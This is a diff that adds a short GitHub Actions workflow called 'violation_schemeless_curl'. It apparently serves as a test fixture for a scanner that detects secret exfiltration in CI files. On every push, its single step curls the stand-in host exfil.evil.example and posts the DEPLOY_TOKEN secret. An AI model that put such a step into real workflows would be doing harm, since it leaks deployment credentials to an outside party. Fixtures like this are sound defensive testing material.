@@ -1,0 +1,7 @@
+name: violation_schemeless_curl
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl exfil.evil.example/collect -d "t=${{ secrets.DEPLOY_TOKEN }}"
